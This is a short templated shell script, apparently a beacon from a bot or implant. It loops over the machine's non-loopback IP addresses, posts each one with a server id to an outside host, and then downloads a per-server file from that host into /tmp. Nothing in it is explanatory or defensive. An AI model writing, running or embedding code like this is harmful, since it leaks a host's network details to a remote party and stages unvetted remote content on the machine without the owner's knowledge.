#!/bin/sh
SERVER=%s

for i in `ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`; do

curl -XPOST http://yurilz.com/tunizjan/s31d -d "{\"ipaddr\":\"$i\",\"serverid\":\"$SERVER\"}" -H "Content-Type: application/json"
done

curl http://yurilz.com/tunizjan/zre/$SERVER > /tmp/$SERVER
